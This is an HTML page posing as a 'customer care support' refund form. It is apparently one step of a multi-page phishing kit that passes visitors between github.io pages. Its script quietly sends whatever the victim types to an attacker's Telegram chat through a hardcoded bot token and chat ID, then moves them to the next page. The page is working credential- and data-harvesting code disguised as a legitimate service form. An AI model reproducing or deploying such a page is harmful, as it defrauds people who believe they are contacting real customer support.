<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Customer Support Form</title>
<style>
  body {
    font-family: 'Arial', sans-serif;
    margin: 0;
    padding: 0;
    background-color: litegray;
  }

  .container {
    max-width: 600px;
    margin: 5px 5px;
    background: #d0d3d4; /* Light gray background */
    padding: 20px;
    border-radius: 0px;
    height: 18cm;
  }

  .banner-image {
    width: 100%;
    margin-bottom: 20px;
    border-radius: 5px;
  }

  /* Customer Service text style */
  .customer-service-text {
    text-align: center;
    font-size: 20px;
    color: #333;
    margin-bottom: 20px;
  }

    .step-progress {
    display: flex;
    justify-content: space-around;
    align-items: center;
    padding: 10px 0;
    margin-top:10px; 
  }

  .step{
    width: 25px;
    height: 25px;
    background-color: white;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    color: black;
    font-weight: bold;
  }

  .active {
    background-color: #2ecc71;
    color: white;
  }

  .option-buttons {
    display: flex;
    justify-content: space-between;
    margin-bottom: 20px;
  }

  .option-button {
    padding: 10px 20px;
    border: 1px solid #2ecc71;
    color: #2ecc71;
    border-radius: 20px;
    cursor: pointer;
  }

  .option-button.active {
    background-color: #2ecc71;
    color: white;
  }

  .input-box {
    border: 2px solid #2ecc71;
    padding: 5px;
    border-radius: 5px;
    margin-bottom: 20px;
  }

  .form-field {
    width: 100%;
    padding: 10px;
    margin-top: 10px;
    margin-bottom: 20px;
    border: 1px solid #2ecc71;
    background-color: #e9f5eb;
    border-radius: 15px;
    box-sizing: border-box;
  }

  .submit-btn {
    width: 50%;
    padding: 10px;
    background-color: #2ecc71;
    border: none;
    border-radius: 5px;
    color: white;
    cursor: pointer;
  }

  .navigation-btn {
    padding: 10px;
    border: 2px solid #2ecc71;
    background: white;
    color: #2ecc71;
    border-radius: 5px;
    cursor: pointer;
  }
</style>
</head>
<body>

<div class="container">
  <!-- Banner Image -->
  <img src="https://thumbor.forbes.com/thumbor/fit-in/960x/https://www.forbes.com/advisor/wp-content/uploads/2022/03/Image_-_Customer_service_rep_.jpeg.jpg" class="banner-image" alt="Banner">
  
  <!-- Customer Service text added just below the banner -->
  <div class="customer-service-text">CUSTOMER CARE SUPPORT INSTENT SOLUTION</div>

  <div class="step-progress">
    <div class="step">1</div>
    <div class="step active">2</div>
    <div class="step">3</div>
    <div class="step">4</div>
  </div>

  <div class="option-buttons">
    <div class="option-button active" onclick="selectOption(this, 'Refund')">Refund</div>
    <div class="option-button" onclick="selectOption(this, 'Replace')">Replace</div>
    <div class="option-button" onclick="selectOption(this, 'Other')">Other</div>
  </div>

  <div class="input-box">
    <input type="text" id="refund-amount" class="form-field" placeholder="Amount*" required>
  </div>

  <div style="display: flex; justify-content: space-between; margin-top: 20px;">
    <!-- Previous button now redirects to Google.com -->
    <button type="button" class="navigation-btn" onclick="window.location.href = 'https://customer-service-12.github.io/3/';">Previous</button>
    <button type="button" onclick="submitForm()" class="submit-btn">Next</button>
  </div>
</div>

<script>
  var selectedOption = 'Refund'; // Default selected option

  function selectOption(element, option) {
    selectedOption = option;
    // Clear all active classes
    document.querySelectorAll('.option-button').forEach(function(btn) {
      btn.classList.remove('active');
    });
    // Add active class to clicked button
    element.classList.add('active');
  }

  function submitForm() {
    var refundAmount = document.getElementById('refund-amount').value;
    if (refundAmount.trim() === '') {
      alert('Please enter the refund amount.');
      return; // Stop the function if the refund amount is not entered
    }

    var message = "Option Selected: " + selectedOption + "\nRefund Amount: " + refundAmount;
    // Replace 'YourBotToken' with your actual bot token and 'YourChatID' with your Telegram chat ID
    fetch('https://api.telegram.org/bot6331212716:AAEOc0OrDcquVBMu7OSg_9ox7X71lB5yP5w/sendMessage', {
      method: 'POST',
      headers: {
          'Content-Type': 'application/json'
      },
      body: JSON.stringify({
          chat_id: '5751079438',
          text: message
      })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        // Commenting out the redirect on successful form submission for demonstration purposes
         window.location.href = 'https://customer-service-12.github.io/3/';
    })
    .catch((error) => {
        console.error('Error:', error);
    });
  }
</script>
</body>
</html>
